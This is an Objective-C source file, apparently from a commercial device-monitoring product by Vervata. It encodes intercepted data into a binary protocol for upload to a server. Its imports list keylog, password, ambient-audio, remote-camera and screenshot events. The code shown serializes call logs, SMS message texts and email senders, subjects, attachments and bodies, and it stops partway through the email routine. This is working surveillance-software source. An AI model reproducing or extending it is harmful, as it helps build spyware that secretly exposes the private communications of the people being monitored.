//
//  ProtocolParser.m
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "ProtocolParser.h"
#import "ResponseData.h"
#import "CommandCodeEnum.h"
#import "SendActivateResponse.h"
#import "SendHeartBeatResponse.h"
#import "SendEventResponse.h"
#import "SendEvent.h"
#import "SendDeactivateResponse.h"
#import "SendAddressBookForApprovalResponse.h"
#import "SendAddressBook.h"
#import "SendAddressBookResponse.h"
#import "RAskResponse.h"

#import "UnknownResponse.h"

#import "PCC.h"
#import "PCCCodeEnum.h"

#import "AddressBook.h"

#import "EventTypeEnum.h"
#import "Event.h"
#import "EventDirectionEnum.h"
#import "CallLogEvent.h"
#import "SMSEvent.h"
#import "EmailEvent.h"
#import "MMSEvent.h"
#import "IMEvent.h"
#import "PanicGPS.h"
#import "PanicImage.h"
#import "AlertGPSEvent.h"
#import "PanicStatus.h"
#import "WallpaperThumbnailEvent.h"
#import "CameraImageThumbnailEvent.h"
#import "AudioFileThumbnailEvent.h"
#import "AudioConversationThumbnailEvent.h"
#import "VideoFileThumbnailEvent.h"
#import "WallpaperEvent.h"
#import "CameraImageEvent.h"
#import "RemoteCameraImageEvent.h"
#import "AudioConversationEvent.h"
#import "VoIPAudioConversationEvent.h"
#import "AudioFileEvent.h"
#import "VideoFileEvent.h"
#import "LocationEvent.h"
#import "GPSEvent.h"
#import "CallInfoEvent.h"
#import "SystemEvent.h"
#import "BrowserUrlEvent.h"
#import "BookmarksEvent.h"
#import "SettingEvent.h"
#import "ALCEvent.h"
#import "AudioAmbientEvent.h"
#import "AudioAmbientThumbnailEvent.h"
#import "IMEventProtocolConverter.h"
#import "VoIPEvent.h"
#import "KeyLogEvent.h"
#import "PageVisitedEvent.h"
#import "PasswordEvent.h"
#import "AppPassword.h"
#import "UsbEvent.h"
#import "LogonEvent.h"
#import "AppUsageEvent.h"
#import "IMMacOSEvent.h"
#import "EmailMacOSEvent.h"
#import "ScreenshotEvent.h"
#import "FileTransferEvent.h"
#import "FileActivityEvent.h"
#import "FileActivityInfo.h"
#import "FileActivityPermission.h"
#import "PrintJobEvent.h"
#import "NetworkTrafficEvent.h"
#import "NetworkInterface.h"
#import "NetworkRemoteHost.h"
#import "NetworkTraffic.h"
#import "NetworkConnectionEvent.h"
#import "NetworkAdapter.h"
#import "NetworkAdapterStatus.h"
#import "NTAlertCriteria.h"
#import "ClientAlert.h"
#import "ClientAlertData.h"
#import "EvaluationFrame.h"
#import "ClientAlertRemoteHost.h"
#import "ClientAlertNetworkTraffic.h"
#import "AppScreenRule.h"
#import "AppScreenShotEvent.h"

#import "GeoTag.h"
#import "Thumbnail.h"
#import "CellInfo.h"
#import "FxVCard.h"
#import "CommunicationDirectiveEvents.h"
#import "CommunicationDirective.h"
#import "CommunicationDirectiveCriteria.h"
#import "ResponseVCardProvider.h"
#import "EmbeddedCallInfo.h"
#import "EmbeddedVoIPCallInfo.h"

// array datastore
#import "Recipient.h"
#import "Attachment.h"
#import "Participant.h"

#import "GetCSIDResponse.h"
#import "GetTimeResponse.h"
#import "GetProcessProfileResponse.h"
#import "GetCommunicationDirectivesResponse.h"
#import "GetConfigurationResponse.h"
#import "GetActivationCodeResponse.h"
#import "GetAddressBookResponse.h"
#import "GetSoftwareUpdateResponse.h"
#import "GetIncompatibleApplicationDefinitionsResponse.h"

#import "GetApplicationProfile.h"
#import "GetApplicationProfileResponse.h"
#import "GetUrlProfile.h"
#import "GetUrlProfileResponse.h"
#import "SendInstalledApplication.h"
#import "SendInstalledApplicationResponse.h"
#import "SendRunningApplication.h"
#import "SendRunningApplicationResponse.h"
#import "SendBookmark.h"
#import "SendBookmarkResponse.h"

#import "ApplicationProfile.h"
#import "ResponseApplicationProfileProvider.h"
#import "UrlProfile.h"
#import "ResponseUrlProfileProvider.h"

#import "CalendarEntry.h"
#import "CalendarProtocolConverter.h"
#import "SendCalendarResponse.h"
#import "Note.h"
#import "NoteProtocolConverter.h"
#import "SendNoteResponse.h"
#import "GetBinaryResponse.h"
#import "GetSupportIMResponse.h"
#import "IMServiceInfo.h"

#import "GetSnapShotRule.h"
#import "GetSnapShotRuleResponse.h"
#import "SendSnapShotRule.h"
#import "SendSnapShotRuleResponse.h"
#import "GetMonitorApplication.h"
#import "GetMonitorApplicationResponse.h"
#import "SendMonitorApplication.h"
#import "SendMonitorApplicationResponse.h"
#import "MonitorApplication.h"
#import "KeyStrokeRule.h"
#import "SnapShotRule.h"

#import "SendDeviceSettings.h"
#import "SendDeviceSettingsResponse.h"

#import "TemporalControl.h"
#import "TemporalActionParams.h"
#import "TemporalControlCriteria.h"

#import "SendTemporalControl.h"
#import "SendTemporalControlResponse.h"
#import "GetTemporalControl.h"
#import "GetTemporalControlResponse.h"

#import "GetNetworkAlertCritiria.h"
#import "GetNetworkAlertCritiriaResponse.h"

#import "SendNetworkAlert.h"
#import "SendNetworkAlertResponse.h"

#import "GetAppScreenShotRule.h"
#import "GetAppScreenShotRuleResponse.h"

#import "CommandMetaData.h"

#import "ProtocolParserUtil.h"

#if TARGET_OS_IPHONE
#include <Endian.h>
#import <Photos/Photos.h>
#else
#import <CoreServices/CoreServices.h>
#endif

@interface ProtocolParser (private)
+ (ResponseData *) parseFileResponse: (NSFileHandle *) aFileHandle;
+ (GetApplicationProfileResponse *) parseGetApplicationProfileResponseData: (NSFileHandle *) aResponseFileHandle
																  filePath: (NSString *) aFilePath;
+ (GetUrlProfileResponse *) parseGetUrlProfileResponseData: (NSFileHandle *) aResponseFileHandle
												  filePath: (NSString *) aFilePath;
+ (GetBinaryResponse *) parseGetBinaryResponseData: (NSFileHandle *) aResponseFileHandle
										  filePath: (NSString *) aFilePath;

+ (NSString *) substring: (NSString*) aString byteNumbers: (NSInteger) aNumberOfBytes;

@end

@implementation ProtocolParser

#pragma mark -
#pragma mark Utils methods

+ (void) GetBytesBigEndian:(Byte*)lpBuffer bufSize:(uint32_t)dwBufferSize {
	for (uint32_t i = 0; i < (dwBufferSize / 2); i++) { 
		Byte c = lpBuffer[i]; 
		lpBuffer[i] = lpBuffer[dwBufferSize - 1 - i]; 
		lpBuffer[dwBufferSize - 1 - i] = c; 
	}
}

+(double) GetDoubleBigEndian:(double)nSrc {
	double nDest = nSrc;
	[self GetBytesBigEndian:(Byte*)&nDest bufSize:sizeof(double)];
	return nDest;
}

//--------------------------------------------------------------------------
// Name: getValueFromData:toBuffer:atOffset
// 
//
// Warning! plus offset with buffer size, so buffer datatype must be preciuse
//--------------------------------------------------------------------------
+ (int)getValueFromData:(NSData *)source toBuffer:(void *)buffer withBufferSize:(int)bufferSize atOffset:(int)offset {
	[source getBytes:buffer range:NSMakeRange(offset, bufferSize)];
	return offset+bufferSize;
}

// ----------------------------------------------------------
//
//
// Warning! pass offset by reference, so it will modify the offset of caller too.
// ----------------------------------------------------------
+ (NSData *)getDataFromFile:(NSFileHandle *)fileHandle length:(int)len atOffset:(unsigned long*)offset {
	[fileHandle seekToFileOffset:*offset];
	NSData *result = [fileHandle readDataOfLength:len];
	*offset+=len;
	return result;
}

//--------------------------------------------------------------------------
//
//
// Warning! plus offset with buffer size, so buffer datatype must be preciuse
//--------------------------------------------------------------
+ (int)getValueFromFile:(NSFileHandle *)fileHandle toBuffer:(void *)buffer withBufferSize:(int)bufferSize atOffset:(int)offset {
	[fileHandle seekToFileOffset:offset];
	NSData *data = [fileHandle readDataOfLength:bufferSize];
	[data getBytes:buffer length:bufferSize];
	return offset + bufferSize;
}

+ (NSData *)parseOnlyCommandCode:(id)command {
	if (!command) {
		return nil;
	}
	DLog(@"parseOnlyCommandCode %@", command);
	uint16_t cmdCode = [command getCommand];
	cmdCode = htons(cmdCode);
	
	NSMutableData *result = [NSMutableData dataWithCapacity:2];
	[result appendBytes:&cmdCode length:sizeof(cmdCode)];
	
	return result;
}


+ (NSString *) substring: (NSString*) aString byteNumbers: (NSInteger) aNumberOfBytes {
	NSData *data  = [aString dataUsingEncoding:NSUTF8StringEncoding];
	NSData *newData = [data subdataWithRange:NSMakeRange(0, aNumberOfBytes)];
	NSString *newString = [[NSString alloc] initWithData:newData encoding:NSUTF8StringEncoding];
	return [newString autorelease];
}

+ (NSString *) getStringOfBytes: (NSUInteger) aByteNumbers inputString: (NSString *) aInputString {
    NSString *outputString      = nil;
    NSUInteger originalSize     = [aInputString lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    
    DLog(@">> ORIGINAL LENGTH %lu",  (unsigned long)originalSize);
    DLog(@">> ORIGINAL TEXT %@",    aInputString);
    
    // -- Ensure that title must less than the byte number argument
    
    if (originalSize > aByteNumbers) {
        
        char outputBuffer[aByteNumbers + 1];                // include the space for NULL-terminated string
        NSUInteger usedLength   = 0;
        NSRange remainingRange  = NSMakeRange(0, 0);
        NSRange range           = NSMakeRange(0, [aInputString length]);
        
        if ([aInputString getBytes:outputBuffer				// The returned bytes are not NULL-terminated.
                         maxLength:255
                        usedLength:&usedLength
                          encoding:NSUTF8StringEncoding
                           options:NSStringEncodingConversionAllowLossy
                             range:range
                    remainingRange:&remainingRange]) {
            outputBuffer[usedLength] = '\0';				// add NULL terminated string
            
            outputString = [[[NSString alloc] initWithCString:outputBuffer encoding:NSUTF8StringEncoding] autorelease];
            
            DLog(@"new text, %@", outputString);
            DLog(@"new size, %lu", (unsigned long)[outputString lengthOfBytesUsingEncoding:NSUTF8StringEncoding]);
            DLog(@"usedLength, %lu", (unsigned long)usedLength);
            DLog(@"remainingRange location, %lu", (unsigned long)remainingRange.location);   // include Character at
            DLog(@"remainingRange length, %lu", (unsigned long)remainingRange.length);
            
            /* a number of chatacter that is cut
             INPUT
             กกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกabก
             
             OUTPUT
             กกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกกก
             
             CUT กกกกกกกabก  ==>    remainning.location =  26 bytes (the output string include up to the 26th character)
                                    remainning.length = 10 (10 character)
             */

        }
        else {
            DLog(@"!!!!! can not get byte from this text...");
            
            DLog(@"Try to get 255");
            outputString = [self substring:aInputString byteNumbers:255];
            
            if (!outputString) {
                DLog(@"Try to get 254");
                outputString = [self substring:aInputString byteNumbers:254];
                
                if (!outputString) {
                    DLog(@"Try to get 253");
                    outputString = [self substring:aInputString byteNumbers:253];
                    if (!outputString) {
                        
                        DLog(@"Try to get 252");
                        outputString = [self substring:aInputString byteNumbers:252];
                    }
                }
            }
            DLog(@"new text 2 approach: %@", outputString);
        }
    }
    
    if (outputString) {
        DLog(@"NEW TEXT: %@", outputString);
    } else {
        outputString = aInputString;
        DLog(@"NO NEED NEW TEXT: %@", aInputString);
    }
    return outputString;
}

#pragma mark -
#pragma mark Recipient, Attachment, Participant, EmbeddedCallInfo parser 

+ (NSData *) parseRecipients:(NSArray *)recipients {
	NSMutableData *result = [NSMutableData data];

	uint16_t recipientCount = [recipients count];
	recipientCount = htons(recipientCount);
	[result appendBytes:&recipientCount length:sizeof(recipientCount)];
	
	uint8_t recipientType;
	NSString *recipient;
	uint8_t recipientSize;
	NSString *recipientContactName;
	uint8_t recipientContactNameSize;
	
	DLog(@"recipients: %@", recipients);
	for (Recipient *obj in recipients) {
		recipientType = [obj recipientType];
		recipient = [obj recipient];
		DLog (@"recipient before %@", recipient)
		
		// for testing
		//recipient = [recipient stringByReplacingOccurrencesOfString:@"<" withString:@""];
		//recipient = [recipient stringByReplacingOccurrencesOfString:@">" withString:@""];
		DLog (@"recipient after %@",  recipient)	
		
		
		recipientSize = [recipient lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		recipientContactName = [obj contactName];
        // Ensure that the contact name size is less than 1 byte according to the protocol
        // find the contact name with valid size
        recipientContactName     = [self getStringOfBytes:255 inputString:recipientContactName];
		recipientContactNameSize = [recipientContactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        DLog(@"$$$$$$$$$$$$$$$$ Email recipient contact name size %d", recipientContactNameSize)
        DLog(@"$$$$$$$$$$$$$$$$ Email recipient contact name %@", recipientContactName)
        
		[result appendBytes:&recipientType length:sizeof(recipientType)];
		DLog(@"result 1 = %@", result);
		[result appendBytes:&recipientSize length:sizeof(recipientSize)];
		DLog(@"result 2 = %@", result);
		[result appendData:[recipient dataUsingEncoding:NSUTF8StringEncoding]];
		DLog(@"result 3 = %@", result);
		[result appendBytes:&recipientContactNameSize length:sizeof(recipientContactNameSize)];
		DLog(@"result 4 = %@", result);
		[result appendData:[recipientContactName dataUsingEncoding:NSUTF8StringEncoding]];
		DLog(@"result 5 = %@", result);
	}
	DLog(@"result 6 = %@", result);
	return result;
}

+ (NSData *) parseRecipientsV10:(NSArray *)recipients {
    NSMutableData *result = [NSMutableData data];
    
    uint16_t recipientCount = [recipients count];
    recipientCount = htons(recipientCount);
    [result appendBytes:&recipientCount length:sizeof(recipientCount)];
    
    uint8_t recipientType;
    NSString *recipient;
    uint16_t recipientSize;
    NSString *recipientContactName;
    uint16_t recipientContactNameSize;
    
    DLog(@"recipients: %@", recipients);
    for (Recipient *obj in recipients) {
        recipientType = [obj recipientType];
        recipient = [obj recipient];
        DLog (@"recipient before: %@", recipient)
        
        recipientSize = [recipient lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        recipientSize = htons(recipientSize);
        
        recipientContactName = [obj contactName];
        // Ensure that the contact name size is less than 2 bytes according to the protocol
        // find the contact name with valid size
        recipientContactName     = [self getStringOfBytes:511 inputString:recipientContactName];
        recipientContactNameSize = [recipientContactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        DLog(@"$$$$$$$$$$$$$$$$ Email recipient contact name size: %d, %d", recipientContactNameSize, htons(recipientContactNameSize))
        DLog(@"$$$$$$$$$$$$$$$$ Email recipient contact name: %@", recipientContactName)
        recipientContactNameSize = htons(recipientContactNameSize);
        
        [result appendBytes:&recipientType length:sizeof(recipientType)];
        [result appendBytes:&recipientSize length:sizeof(recipientSize)];
        [result appendData:[recipient dataUsingEncoding:NSUTF8StringEncoding]];
        [result appendBytes:&recipientContactNameSize length:sizeof(recipientContactNameSize)];
        [result appendData:[recipientContactName dataUsingEncoding:NSUTF8StringEncoding]];
    }
    return result;
}

+ (NSData *)parseAttachments:(NSArray *)attachments {
	NSMutableData *result = [NSMutableData data];
	uint8_t attachmentCount = [attachments count];
	DLog(@"attachmentCount = %d", attachmentCount);
	[result appendBytes:&attachmentCount length:sizeof(attachmentCount)];
	
	uint16_t fullNameSize;
	NSString *fullName;
	uint32_t dataSize;
	NSData *data;
	
	for (Attachment* obj in attachments) {
		fullName = [[obj attachmentFullName] lastPathComponent];
		fullNameSize = [fullName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		fullNameSize = htons(fullNameSize);
		data = [obj attachmentData];
		dataSize = [data length];
		dataSize = htonl(dataSize);
		
		[result appendBytes:&fullNameSize length:sizeof(fullNameSize)];
		[result appendData:[fullName dataUsingEncoding:NSUTF8StringEncoding]];
		[result appendBytes:&dataSize length:sizeof(dataSize)];
		[result appendData:data];
	}
	
	return result;
}

+ (NSData *)parseAttachmentsV10:(NSArray *)attachments {
    NSMutableData *result = [NSMutableData data];
    uint16_t attachmentCount = [attachments count];
    DLog(@"attachmentCount = %d", attachmentCount);
    attachmentCount = htons(attachmentCount);
    [result appendBytes:&attachmentCount length:sizeof(attachmentCount)];
    
    uint16_t fullNameSize;
    NSString *fullName;
    uint32_t dataSize;
    NSData *data;
    
    for (Attachment* obj in attachments) {
        fullName = [[obj attachmentFullName] lastPathComponent];
        fullNameSize = [fullName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
        fullNameSize = htons(fullNameSize);
        data = [obj attachmentData];
        dataSize = [data length];
        dataSize = htonl(dataSize);
        
        [result appendBytes:&fullNameSize length:sizeof(fullNameSize)];
        [result appendData:[fullName dataUsingEncoding:NSUTF8StringEncoding]];
        [result appendBytes:&dataSize length:sizeof(dataSize)];
        [result appendData:data];
    }
    
    return result;
}

+ (NSData *)parseParticipants:(NSArray *)participants {
	NSMutableData *result = [NSMutableData data];
	
	uint16_t participantCount = [participants count];
	participantCount = htons(participantCount);
	
	[result appendBytes:&participantCount length:sizeof(participantCount)];
	
	uint8_t nameSize;
	NSString *name;
	uint8_t UIDSize;
	NSString *UID;
	
	for (Participant* obj in participants) {
		name = [obj name];
		nameSize = [name lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		UID = [obj UID];
		UIDSize = [UID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		
		[result appendBytes:&nameSize length:sizeof(nameSize)];
		[result appendData:[name dataUsingEncoding:NSUTF8StringEncoding]];
		[result appendBytes:&UIDSize length:sizeof(UIDSize)];
		[result appendData:[UID dataUsingEncoding:NSUTF8StringEncoding]];
		
	}
	
	return result;
}

+ (NSData *)parseEmbeddedCallInfo:(EmbeddedCallInfo *)callInfo {
	uint8_t direction = [callInfo direction];
	uint32_t duration = [callInfo duration];
    duration = htonl(duration);
	NSString *number = [callInfo number];
	uint8_t numberSize = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *contactName = [callInfo contactName];
    contactName = [self getStringOfBytes:255 inputString:contactName];
    DLog(@"contactName: %@", contactName);
	uint8_t contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	
	NSMutableData *result = [NSMutableData dataWithCapacity:20];
	[result appendBytes:&direction length:sizeof(direction)];
	[result appendBytes:&duration length:sizeof(duration)];
	[result appendBytes:&numberSize length:sizeof(numberSize)];
	[result appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&contactNameSize length:sizeof(contactNameSize)];
	[result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
		
	return result;
}

+ (NSData *)parseEmbeddedVoIPCallInfo:(EmbeddedVoIPCallInfo *)aVoIPCallInfo {
    uint8_t recipientType = [aVoIPCallInfo mRecipientType];
    NSString *number_email = [aVoIPCallInfo number];
    uint8_t number_emailSize = [number_email lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    NSString *contactName = [aVoIPCallInfo contactName];
    contactName = [self getStringOfBytes:255 inputString:contactName];
    DLog(@"contactName: %@", contactName);
    uint8_t contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    
    NSMutableData *result = [NSMutableData dataWithCapacity:20];
    [result appendBytes:&recipientType length:sizeof(uint8_t)];
    [result appendBytes:&number_emailSize length:sizeof(uint8_t)];
    [result appendData:[number_email dataUsingEncoding:NSUTF8StringEncoding]];
    [result appendBytes:&contactNameSize length:sizeof(uint8_t)];
    [result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
    
    return result;
}

+ (void) parseAttachmentFile: (NSString *) aFilePath payloadFileHandle: (NSFileHandle *) aFileHandle {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSDictionary *attr = [fileManager attributesOfItemAtPath:aFilePath error:&error];
    DLog (@"Attributes of attachment file = %@, error = %@", attr, error);
    if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
        NSString *actualPathForSymbolicLink = [fileManager destinationOfSymbolicLinkAtPath:aFilePath error:NULL];
        DLog(@"File path for symbolic link: %@", actualPathForSymbolicLink)
        
        attr = [fileManager attributesOfItemAtPath:actualPathForSymbolicLink error:&error];
    }
    DLog (@"fileSize = %lld", [attr fileSize]);
    
    uint32_t mediaDataSize = 0;
    NSMutableData *result = [NSMutableData data];
    if (!error) {
        mediaDataSize = [attr fileSize];
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
        
        // File data
        NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:aFilePath];
        NSUInteger megabyte = pow(1024, 2);
        while (1) {
            //[result appendData:mediaData];
            
            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
            NSData *bytes = [fileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
            NSInteger size = [bytes length];
            [aFileHandle writeData:bytes];
            [aFileHandle synchronizeFile]; // Flus data to file
            bytes = nil;
            [pool release];
            
            if (size == 0) {
                break;
            }
        }
        [fileHandle closeFile];
        
    } else {
        mediaDataSize = 0;
        mediaDataSize = htonl(mediaDataSize);
        [result appendBytes:&mediaDataSize length:sizeof(mediaDataSize)];
        
        [aFileHandle writeData:result];
    }
}

#pragma mark -
#pragma mark Parse activate
+ (NSData *)parseActivateRequest:(SendActivate *)command {
	if (!command) {
		return nil;
	}
	unsigned short cmdCode = [command getCommand];
	NSString *deviceInfo = [command deviceInfo];
	NSString *deviceModel = [command deviceModel];
	uint8_t deviceInfoLength = [deviceInfo lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	uint8_t deviceModelLength = [deviceModel lengthOfBytesUsingEncoding:NSUTF8StringEncoding];

	cmdCode = htons(cmdCode);

	NSMutableData *result = [NSMutableData dataWithCapacity:(2 + 2 + deviceInfoLength + deviceModelLength)];

	[result appendBytes:&cmdCode length:sizeof(cmdCode)];
	[result appendBytes:&deviceInfoLength length:sizeof(deviceInfoLength)];
	[result appendData:[deviceInfo dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&deviceModelLength length:sizeof(deviceModelLength)];
	[result appendData:[deviceModel dataUsingEncoding:NSUTF8StringEncoding]];

	return result;
}

#pragma mark -
#pragma mark Parse deactivate
+ (NSData *)parseDeactivateRequest:(SendDeactivate *)command {
	return [self parseOnlyCommandCode:command];
}

#pragma mark -
#pragma mark Parse Heartbeat
+ (NSData *)parseHeartbeatRequest:(SendHeartBeat *)command {
	return [self parseOnlyCommandCode:command];
}



#pragma mark -
#pragma mark Parse Events
+ (NSData *)parseEventRequest:(SendEvent *)command {
	if (!command) {
		return nil;
	}
	unsigned short cmdCode = [command getCommand];
	cmdCode = htons(cmdCode);
	uint16_t eventCount = [command eventCount];
	eventCount = htons(eventCount);
	
	NSMutableData *result = [NSMutableData dataWithCapacity:2];
	[result appendBytes:&cmdCode length:sizeof(cmdCode)];
	[result appendBytes:&eventCount length:sizeof(eventCount)];
	
	id<DataProvider> provider = [command eventProvider];
	while ([provider hasNext]) {
		NSData *eventData = [self parseEvent:[provider getObject] payloadFileHandle:nil]; // use allocated instance so don't forget to release
		[result appendData:eventData];
	}
	return result;
}

+ (NSData *)parseCallLogEvent:(CallLogEvent *)event {
	uint8_t direction;
	uint32_t duration;
	uint8_t numberSize;
	NSString *number;
	uint8_t contactNameSize;
	NSString *contactName;
	direction = [event direction];
	duration = [event duration];
	number = [event number];
	contactName = [event contactName];
	numberSize = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	duration = htonl(duration);
    
    //DLog(@"$$$$$$$$$$$$$$$$ Call log contact name size %d", contactNameSize)
    //DLog(@"$$$$$$$$$$$$$$$$ Call log contact name full size %lu",  (unsigned long)[contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding])
    //DLog(@"$$$$$$$$$$$$$$$$ Call log contact name %@", contactName)
    // Ensure that the contact name size is less than 1 byte according to the protocol
    // find the contact name with valid size
    contactName     = [self getStringOfBytes:255 inputString:contactName];
    contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog(@"$$$$$$$$$$$$$$$$ Call log contact name size %d", contactNameSize)
    DLog(@"$$$$$$$$$$$$$$$$ Call log contact name full size %lu",  (unsigned long)[contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding])
    DLog(@"$$$$$$$$$$$$$$$$ Call log contact name %@", contactName)

	NSMutableData *result = [[NSMutableData alloc] initWithCapacity:(1 + 4 + 1 + 1 + numberSize + contactNameSize)];
	[result appendBytes:&direction length:sizeof(direction)];
	[result appendBytes:&duration length:sizeof(duration)];
	[result appendBytes:&numberSize length:sizeof(numberSize)];
	[result appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
	[result appendBytes:&contactNameSize length:sizeof(contactNameSize)];
	[result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
	
	return [result autorelease];
}

+ (NSData *)parseSMSEvent:(SMSEvent *)event {
	uint8_t direction;
	uint8_t conversationIDSize;
	NSString *conversationID;
	uint8_t senderNumberSize;
	NSString *senderNumber;
	uint8_t contactNameSize;
	NSString *contactName;
	direction = [event direction];
	conversationID = [event mConversationID];
	conversationIDSize = [conversationID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	senderNumber = [event senderNumber];
	senderNumberSize = [senderNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//DLog(@"senderNumberSize %d", senderNumberSize);
	contactName = [event contactName];
    // Ensure that the contact name size is less than 1 byte according to the protocol
    // find the contact name with valid size
    contactName     = [self getStringOfBytes:255 inputString:contactName];
	contactNameSize = [contactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog(@"contactNameSize %d", contactNameSize);
    DLog(@"$$$$$$$$$$$$$$$$ SMS log contact name %@", contactName)
    
	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&direction length:sizeof(direction)];
	//DLog(@"result = %@", result);
	[result appendBytes:&conversationIDSize length:sizeof(conversationIDSize)];
	//DLog(@"result = %@", result);
	[result appendData:[conversationID dataUsingEncoding:NSUTF8StringEncoding]];
//	DLog(@"sizeof(senderNumberSize) = %d", sizeof(senderNumberSize));
	[result appendBytes:&senderNumberSize length:sizeof(senderNumberSize)];
	//DLog(@"appendData senderNumber %@ to %@", [senderNumber dataUsingEncoding:NSUTF8StringEncoding], result);
	[result appendData:[senderNumber dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
//	DLog(@"sizeof(contactNameSize) = %d", sizeof(contactNameSize));
	[result appendBytes:&contactNameSize length:sizeof(contactNameSize)];
	//DLog(@"appendData contactName %@ to %@", [contactName dataUsingEncoding:NSUTF8StringEncoding], result);
	[result appendData:[contactName dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result appendData contactName = %@", result);
	
	NSData *recipients = [self parseRecipients:[event recipientStore]];
	[result appendData:recipients];
	//DLog(@"result appendData recipients = %@", result);
	
	uint16_t SMSDataSize;
	NSString *SMSData;
	SMSData = [event SMSData];
	SMSDataSize = [SMSData lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//DLog(@"SMSDataSize %d", SMSDataSize);
	SMSDataSize = htons(SMSDataSize);
	
	[result appendBytes:&SMSDataSize length:sizeof(SMSDataSize)];
	//DLog(@"result appendBytes SMSDataSize = %@", result);
	//DLog(@"appendData SMSData %@ to %@", [SMSData dataUsingEncoding:NSUTF8StringEncoding], result);
	[result appendData:[SMSData dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result appendData SMSData = %@", result);
	
	return [result autorelease];
}

+ (NSData *)parseEmailEvent:(EmailEvent *)event {
	uint8_t direction;				// 1 byte
	uint8_t senderEmailSize;		// 1 byte
	NSString *senderEmail;	
	uint8_t senderContactNameSize;	// 1 byte
	NSString *senderContactName;
	
	direction = [event direction];
	senderEmail = [event senderEmail];
	//DLog (@"sender email before %@",  senderEmail)
	
	// for testing purpose
	//senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@"<" withString:@""];
	//senderEmail = [senderEmail stringByReplacingOccurrencesOfString:@">" withString:@""];
	//DLog (@"sender email after %@",  senderEmail)	
	
	senderEmailSize = [senderEmail lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//DLog (@"sender email SIZE %d",  senderEmailSize)
	senderContactName = [event contactName];
    //DLog (@"sender contact name %@",  senderContactName)
    
    // Ensure that the contact name size is less than 1 byte according to the protocol
    // find the contact name with valid size
    senderContactName     = [self getStringOfBytes:255 inputString:senderContactName];
	senderContactNameSize = [senderContactName lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//DLog (@"sender contact SIZE %d",  senderContactNameSize)
    DLog(@"$$$$$$$$$$$$$$$$ Email sender contact name size %d", senderContactNameSize)

	NSMutableData *result = [[NSMutableData alloc] init];
	
	[result appendBytes:&direction length:sizeof(direction)];
	//DLog(@"result = %@", result);
	[result appendBytes:&senderEmailSize length:sizeof(senderEmailSize)];
	//DLog(@"result = %@", result);
	[result appendData:[senderEmail dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
	[result appendBytes:&senderContactNameSize length:sizeof(senderContactNameSize)];
	//DLog(@"result = %@", result);
	[result appendData:[senderContactName dataUsingEncoding:NSUTF8StringEncoding]];
	//DLog(@"result = %@", result);
	
	NSData *recipients = [self parseRecipients:[event recipientStore]];
	[result appendData:recipients];
	
	uint16_t subjectSize;
	NSString *subject;
	subject = [event subject];
	subjectSize = [subject lengthOfBytesUsingEncoding:NSUTF8StringEncoding];	
	subjectSize = htons(subjectSize);
	
	[result appendBytes:&subjectSize length:sizeof(subjectSize)];
	
	//DLog(@"appendData subject %@ to %@", [subject dataUsingEncoding:NSUTF8StringEncoding], result);
	
	[result appendData:[subject dataUsingEncoding:NSUTF8StringEncoding]];
	
	NSData *attachments = [self parseAttachments:[event attachmentStore]];
	[result appendData:attachments];
	//DLog(@"appendData attachments %@ to %@", attachments, result);
	
	uint32_t bodySize;
	NSString *body;
	body = [event emailBody];
	bodySize = [body lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	//DLog(@"bodySize = %d", bodySize);
	bodySize = htonl(bodySize);
	//DLog(@"appendData 1 %d to %@", bodySize, result);
